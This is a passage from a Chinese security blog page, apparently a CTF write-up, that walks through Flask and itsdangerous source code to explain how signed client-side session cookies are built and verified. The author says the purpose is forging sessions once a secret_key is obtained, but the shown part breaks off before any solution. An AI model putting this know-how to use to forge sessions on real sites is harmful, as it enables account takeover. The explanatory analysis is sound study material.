<!DOCTYPE html>












  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">












<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">






















<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">


  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">









<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '6.3.0',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: false,
    fastclick: false,
    lazyload: false,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>


  




  <meta name="description" content="personal blog">
<meta name="keywords" content="ctf web IT">
<meta property="og:type" content="website">
<meta property="og:title" content="Image&#39;s blog">
<meta property="og:url" content="https://hexo.imagemlt.xyz/page/2/index.html">
<meta property="og:site_name" content="Image&#39;s blog">
<meta property="og:description" content="personal blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Image&#39;s blog">
<meta name="twitter:description" content="personal blog">






  <link rel="canonical" href="https://hexo.imagemlt.xyz/page/2/">



<script type="text/javascript" id="page.configurations">
  CONFIG.page = {
    sidebar: "",
  };
</script>

  <title>Image's blog &mdash; Welcome to Image's Blog</title>
  









  <noscript>
  <style type="text/css">
    .use-motion .motion-element,
    .use-motion .brand,
    .use-motion .menu-item,
    .sidebar-inner,
    .use-motion .post-block,
    .use-motion .pagination,
    .use-motion .comments,
    .use-motion .post-header,
    .use-motion .post-body,
    .use-motion .collection-title { opacity: initial; }

    .use-motion .logo,
    .use-motion .site-title,
    .use-motion .site-subtitle {
      opacity: initial;
      top: initial;
    }

    .use-motion {
      .logo-line-before i { left: initial; }
      .logo-line-after i { right: initial; }
    }
  </style>
</noscript>

</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
	<a href="https://github.com/imagemlt"><img style="position: absolute; top: 0; right: 0; border: 0;z-index:1" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Image's blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
    
      
        <h1 class="site-subtitle" itemprop="description">Welcome to Image's Blog</h1>
      
    
  </div>

  <div class="site-nav-toggle">
    <button aria-label="Toggle navigation bar">
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>



<nav class="site-nav">
  
    <ul id="menu" class="menu">
      
        
        
        
          
          <li class="menu-item menu-item-home">
    <a href="/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-about">
    <a href="/about/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-tags">
    <a href="/tags/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-categories">
    <a href="/categories/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-th"></i> <br>Categories</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-archives">
    <a href="/archives/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
  </li>
        
        
        
          
          <li class="menu-item menu-item-links">
    <a href="/links/" rel="section">
      <i class="menu-item-icon fa fa-fw fa-link"></i> <br>Links</a>
  </li>

      
      
    </ul>
  

  

  
</nav>



  



</div>
    </header>

    


    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          
            

          
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/flask-session/index.html">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Imagemlt">
      <meta itemprop="description" content="personal blog">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Image's blog">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/post/flask-session/index.html" itemprop="url">
                  从hctf的两道web题谈flask客户端session机制
                </a>
              
            
          </h2>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              

              
                
              

              <time title="Created: 2018-11-12 19:50:20" itemprop="dateCreated datePublished" datetime="2018-11-12T19:50:20+08:00">2018-11-12</time>
            

            
              

              
                
                <span class="post-meta-divider">|</span>
                

                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Edited on</span>
                
                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
              
            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <blockquote>
<p>首发于安全客<a href="https://www.anquanke.com/post/id/163975">https://www.anquanke.com/post/id/163975</a></p>
</blockquote>
<blockquote>
<p>这次hctf中有两道获取flask的secret_key生成客户端session的题目，为了能做出这两道题目来也是深入研究了一下flask客户端session的生成机制。所以这篇文章主要详细讨论一下flask客户端session的生成以及校验过程，以及在了解了flask客户端session机制后这两道题的解法。</p>
</blockquote>
<p>个人第一次见到关于客户端session的文章是pith0n师傅的一片文章<a href="https://www.leavesongs.com/PENETRATION/client-session-security.html"><code>客户端session导致的安全问题</code></a>。然而做题的时候只看phith0n师傅的这篇文章感觉还是有点儿懵逼。。。（也可能是我太菜了233）所以就只能翻flask的源码跟了一遍flask对session的处理流程。</p>
<h2 id="flask对客户端session的处理机制"><a href="#flask对客户端session的处理机制" class="headerlink" title="flask对客户端session的处理机制"></a>flask对客户端session的处理机制</h2><p>flask对session的处理位于flask/sessions.py中，默认情况下flask的session以cookie的形式保存于客户端，利用签名机制来防止数据被篡改。<br>在<code>flask/sessions.py</code>中，<code>SecureCookieSessionInterface</code>用于封装对CookieSession的一系列操作：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureCookieSessionInterface</span><span class="params">(SessionInterface)</span>:</span></span><br><span class="line">    <span class="string">"""The default session interface that stores sessions in signed cookies</span></span><br><span class="line"><span class="string">    through the :mod:`itsdangerous` module.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="comment"># salt,默认为cookie-session</span></span><br><span class="line">    salt = <span class="string">'cookie-session'</span></span><br><span class="line">    <span class="comment">#: 默认哈希函数为hashlib.sha1</span></span><br><span class="line">    digest_method = staticmethod(hashlib.sha1)</span><br><span class="line">    <span class="comment">#:默认密钥推导方式 :hmac</span></span><br><span class="line">    key_derivation = <span class="string">'hmac'</span></span><br><span class="line">    <span class="comment">#:默认序列化方式：session_json_serializer</span></span><br><span class="line">    serializer = session_json_serializer</span><br><span class="line">    session_class = SecureCookieSession</span><br></pre></td></tr></table></figure></p>
<p>这里默认的序列化方式的定义为: </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_json_serializer = TaggedJSONSerializer()</span><br></pre></td></tr></table></figure>
<p>可以看到默认使用taggedJSONSerializer做序列化<br><code>taggedJSONSerializer</code>定义：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaggedJSONSerializer</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""A customized JSON serializer that supports a few extra types that</span></span><br><span class="line"><span class="string">    we take for granted when serializing (tuples, markup objects, datetime).</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">_tag</span><span class="params">(value)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> isinstance(value, tuple):</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">' t'</span>: [_tag(x) <span class="keyword">for</span> x <span class="keyword">in</span> value]&#125;</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, uuid.UUID):</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">' u'</span>: value.hex&#125;</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, bytes):</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">' b'</span>: b64encode(value).decode(<span class="string">'ascii'</span>)&#125;</span><br><span class="line">            <span class="keyword">elif</span> callable(getattr(value, <span class="string">'__html__'</span>, <span class="keyword">None</span>)):</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">' m'</span>: text_type(value.__html__())&#125;</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, list):</span><br><span class="line">                <span class="keyword">return</span> [_tag(x) <span class="keyword">for</span> x <span class="keyword">in</span> value]</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, datetime):</span><br><span class="line">                <span class="keyword">return</span> &#123;<span class="string">' d'</span>: http_date(value)&#125;</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, dict):</span><br><span class="line">                <span class="keyword">return</span> dict((k, _tag(v)) <span class="keyword">for</span> k, v <span class="keyword">in</span> iteritems(value))</span><br><span class="line">            <span class="keyword">elif</span> isinstance(value, str):</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> text_type(value)</span><br><span class="line">                <span class="keyword">except</span> UnicodeError:</span><br><span class="line">                    <span class="keyword">raise</span> UnexpectedUnicodeError(<span class="string">u'A byte string with '</span></span><br><span class="line">                        <span class="string">u'non-ASCII data was passed to the session system '</span></span><br><span class="line">                        <span class="string">u'which can only store unicode strings.  Consider '</span></span><br><span class="line">                        <span class="string">u'base64 encoding your string (String was %r)'</span> % value)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">        <span class="keyword">return</span> json.dumps(_tag(value), separators=(<span class="string">','</span>, <span class="string">':'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, value)</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">object_hook</span><span class="params">(obj)</span>:</span></span><br><span class="line">            <span class="keyword">if</span> len(obj) != <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> obj</span><br><span class="line">            the_key, the_value = next(iteritems(obj))</span><br><span class="line">            <span class="keyword">if</span> the_key == <span class="string">' t'</span>:</span><br><span class="line">                <span class="keyword">return</span> tuple(the_value)</span><br><span class="line">            <span class="keyword">elif</span> the_key == <span class="string">' u'</span>:</span><br><span class="line">                <span class="keyword">return</span> uuid.UUID(the_value)</span><br><span class="line">            <span class="keyword">elif</span> the_key == <span class="string">' b'</span>:</span><br><span class="line">                <span class="keyword">return</span> b64decode(the_value)</span><br><span class="line">            <span class="keyword">elif</span> the_key == <span class="string">' m'</span>:</span><br><span class="line">                <span class="keyword">return</span> Markup(the_value)</span><br><span class="line">            <span class="keyword">elif</span> the_key == <span class="string">' d'</span>:</span><br><span class="line">                <span class="keyword">return</span> parse_date(the_value)</span><br><span class="line">            <span class="keyword">return</span> obj</span><br><span class="line">        <span class="keyword">return</span> json.loads(value, object_hook=object_hook)</span><br></pre></td></tr></table></figure></p>
<p>可以看到本质还是一个添加了类型属性的json处理。<br><code>SecureCookieSessionInterface</code>类的获取签名验证序列化器函数为<code>get_signing_serializer</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_signing_serializer</span><span class="params">(self, app)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> app.secret_key:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    signer_kwargs = dict(</span><br><span class="line">        key_derivation=self.key_derivation,</span><br><span class="line">        digest_method=self.digest_method</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> URLSafeTimedSerializer(app.secret_key, salt=self.salt,</span><br><span class="line">                                  serializer=self.serializer,</span><br><span class="line">                                  signer_kwargs=signer_kwargs)</span><br></pre></td></tr></table></figure></p>
<p>可以看到最后使用的签名序列化器为<code>URLSafeTimedSerializer</code>，并且传入app.secret_key用于签名。<br><code>SecureCookieSessionInterface</code>的open_session与save_session方法表示了对session的处理<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">open_session</span><span class="params">(self, app, request)</span>:</span></span><br><span class="line">    s = self.get_signing_serializer(app)</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    val = request.cookies.get(app.session_cookie_name)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> val:</span><br><span class="line">        <span class="keyword">return</span> self.session_class()</span><br><span class="line">    max_age = total_seconds(app.permanent_session_lifetime)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = s.loads(val, max_age=max_age)<span class="comment">#max_age</span></span><br><span class="line">        <span class="keyword">return</span> self.session_class(data)</span><br><span class="line">    <span class="keyword">except</span> BadSignature:</span><br><span class="line">        <span class="keyword">return</span> self.session_class()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_session</span><span class="params">(self, app, session, response)</span>:</span></span><br><span class="line">    domain = self.get_cookie_domain(app)</span><br><span class="line">    path = self.get_cookie_path(app)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session:</span><br><span class="line">        <span class="keyword">if</span> session.modified:</span><br><span class="line">            response.delete_cookie(app.session_cookie_name,</span><br><span class="line">                                   domain=domain, path=path)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    httponly = self.get_cookie_httponly(app)</span><br><span class="line">    secure = self.get_cookie_secure(app)</span><br><span class="line">    expires = self.get_expiration_time(app, session)</span><br><span class="line">    <span class="keyword">print</span> self.get_signing_serializer(app)</span><br><span class="line">    val = self.get_signing_serializer(app).dumps(dict(session))</span><br><span class="line">    response.set_cookie(app.session_cookie_name, val,</span><br><span class="line">                        expires=expires, httponly=httponly,</span><br><span class="line">                        domain=domain, path=path, secure=secure)</span><br></pre></td></tr></table></figure></p>
<p>可以看到从客户端获取session时获取对应的cookie值，并使用序列化器序列化，能够成功序列化即可获取sesison_class,否则返回一个空的session_class.</p>
<p><code>SecureCookieSession</code>使用的默认序列化器<code>URLSafeTimedSeriallizer</code>位于itsdangerous模块中：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">URLSafeTimedSerializer</span><span class="params">(URLSafeSerializerMixin, TimedSerializer)</span>:</span></span><br><span class="line">    <span class="string">"""Works like :class:`TimedSerializer` but dumps and loads into a URL</span></span><br><span class="line"><span class="string">    safe string consisting of the upper and lowercase character of the</span></span><br><span class="line"><span class="string">    alphabet as well as ``'_'``, ``'-'`` and ``'.'``.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    default_serializer = compact_json</span><br></pre></td></tr></table></figure></p>
<h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>序列化的流程在<code>TimedSerializer</code>的父类<code>Serializer</code>中<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dumps</span><span class="params">(self, obj, salt=None)</span>:</span></span><br><span class="line">    <span class="string">"""Returns a signed string serialized with the internal serializer.</span></span><br><span class="line"><span class="string">    The return value can be either a byte or unicode string depending</span></span><br><span class="line"><span class="string">    on the format of the internal serializer.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    payload = want_bytes(self.dump_payload(obj))</span><br><span class="line">    rv = self.make_signer(salt).sign(payload)</span><br><span class="line">    <span class="keyword">if</span> self.is_text_serializer:</span><br><span class="line">        rv = rv.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">return</span> rv</span><br></pre></td></tr></table></figure></p>
<p>可以看到主要处理流程是将obj用dump_payload签名后利用<code>make_signer(salt)</code>生成的signer进行签名处理，并返回签名后的结果即为我们所需要的cookie值，而<code>URLSafeTimedSeralizer</code>的dump_playload方法继承自<code>URLSafeSerializerMixin</code>的dump_payload方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_payload</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">    json = super(URLSafeSerializerMixin, self).dump_payload(obj)</span><br><span class="line"> is_compressed = <span class="keyword">False</span></span><br><span class="line">    compressed = zlib.compress(json)</span><br><span class="line">    <span class="keyword">if</span> len(compressed) &lt; (len(json) - <span class="number">1</span>):</span><br><span class="line">        json = compressed</span><br><span class="line">        is_compressed = <span class="keyword">True</span></span><br><span class="line">    base64d = base64_encode(json)</span><br><span class="line">    <span class="keyword">if</span> is_compressed:</span><br><span class="line">        base64d = <span class="string">b'.'</span> + base64d</span><br><span class="line">    <span class="keyword">return</span> base64d</span><br></pre></td></tr></table></figure></p>
<p>对obj的处理首先使用<code>URLSafeTimedSeralizer</code>的另一个父类<code>TimedSeralizer</code>继承自<code>Seralizer</code>的<code>dump_payload</code>方法处理<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump_payload</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">    <span class="string">"""Dumps the encoded object.  The return value is always a</span></span><br><span class="line"><span class="string">    bytestring.  If the internal serializer is text based the value</span></span><br><span class="line"><span class="string">    will automatically be encoded to utf-8.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> want_bytes(self.serializer.dumps(obj))</span><br></pre></td></tr></table></figure></p>
<p>其中self.serializer为之前<code>SecureCookieSessionInterface</code>的<code>get_signing_serializer</code>传入，即<code>taggedJSONSerializer</code>。<br>处理之后如果长度过长会进行一次zlib压缩，最后将生成的数据base64编码。</p>
<p>再回到之前Seralizer的dumps的处理流程中，self.make_signer(salt)的定义如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_signer</span><span class="params">(self, salt=None)</span>:</span></span><br><span class="line">    <span class="string">"""A method that creates a new instance of the signer to be used.</span></span><br><span class="line"><span class="string">    The default implementation uses the :class:`Signer` baseclass.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> salt <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        salt = self.salt</span><br><span class="line">    <span class="keyword">return</span> self.signer(self.secret_key, salt=salt, **self.signer_kwargs)</span><br></pre></td></tr></table></figure></p>
<p>self.salt、self.signer_kwargs、self.secret_key来自之前<code>SecureCookieSessionInterface</code>的<code>get_signing_serializer</code>传入，分别为<code>app.secret_key</code>、<code>&#39;cookie-session&#39;</code>、<code>{&#39;key_derivation&#39;:&#39;hmac&#39;,&#39;digest_method&#39;=staticmethod(hashlib.sha1)}</code>，而self.signer为<code>TimedSeralizer</code>中指定<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimedSerializer</span><span class="params">(Serializer)</span>:</span></span><br><span class="line">    <span class="string">"""Uses the :class:`TimestampSigner` instead of the default</span></span><br><span class="line"><span class="string">    :meth:`Signer`.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    default_signer = TimestampSigner</span><br></pre></td></tr></table></figure></p>
<p>TimestampSigner签名过程为：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(self, value)</span>:</span></span><br><span class="line">    <span class="string">"""Signs the given string and also attaches a time information."""</span></span><br><span class="line"> value = want_bytes(value)</span><br><span class="line">    timestamp = base64_encode(int_to_bytes(self.get_timestamp()))</span><br><span class="line">    sep = want_bytes(self.sep)</span><br><span class="line">    value = value + sep + timestamp</span><br><span class="line">    <span class="keyword">return</span> value + sep + self.get_signature(value)</span><br></pre></td></tr></table></figure></p>
<p>将传入的value拼接上时间戳之后再拼接签名内容，签名实现继承自<code>Signer</code>类的<code>get_signature</code>方法<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_signature</span><span class="params">(self, value)</span>:</span></span><br><span class="line">    <span class="string">"""Returns the signature for the given value"""</span></span><br><span class="line">    value = want_bytes(value)</span><br><span class="line">    key = self.derive_key()</span><br><span class="line">    sig = self.algorithm.get_signature(key, value)</span><br><span class="line">    <span class="keyword">return</span> base64_encode(sig)</span><br></pre></td></tr></table></figure></p>
<p>因此，整个序列化的流程便是将obj处理为json格式后根据长度选择是否zlib压缩，之后再进行base64加密，拼接上当前时间戳之后再使用hmac签名并且拼接到该字符串上即为我们所需要的payload。</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>反签名的流程主要为<code>TimedSerializer</code>类的loads函数<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TimedSerializer</span><span class="params">(Serializer)</span>:</span></span><br><span class="line">    <span class="string">"""Uses the :class:`TimestampSigner` instead of the default</span></span><br><span class="line"><span class="string">    :meth:`Signer`.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    default_signer = TimestampSigner</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(self, s, max_age=None, return_timestamp=False, salt=None)</span>:</span></span><br><span class="line">        <span class="string">"""Reverse of :meth:`dumps`, raises :exc:`BadSignature` if the</span></span><br><span class="line"><span class="string">        signature validation fails.  If a `max_age` is provided it will</span></span><br><span class="line"><span class="string">        ensure the signature is not older than that time in seconds.  In</span></span><br><span class="line"><span class="string">        case the signature is outdated, :exc:`SignatureExpired` is raised</span></span><br><span class="line"><span class="string">        which is a subclass of :exc:`BadSignature`.  All arguments are</span></span><br><span class="line"><span class="string">        forwarded to the signer's :meth:`~TimestampSigner.unsign` method.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        base64d, timestamp = self.make_signer(salt) \</span><br><span class="line">            .unsign(s, max_age, return_timestamp=<span class="keyword">True</span>)</span><br><span class="line">        payload = self.load_payload(base64d)</span><br><span class="line">        <span class="keyword">if</span> return_timestamp:</span><br><span class="line">            <span class="keyword">return</span> payload, timestamp</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">loads_unsafe</span><span class="params">(self, s, max_age=None, salt=None)</span>:</span></span><br><span class="line">        load_kwargs = &#123;<span class="string">'max_age'</span>: max_age&#125;</span><br><span class="line">        load_payload_kwargs = &#123;&#125;</span><br><span class="line">        <span class="keyword">return</span> self._loads_unsafe_impl(s, salt, load_kwargs, load_payload_kwargs)</span><br></pre></td></tr></table></figure></p>
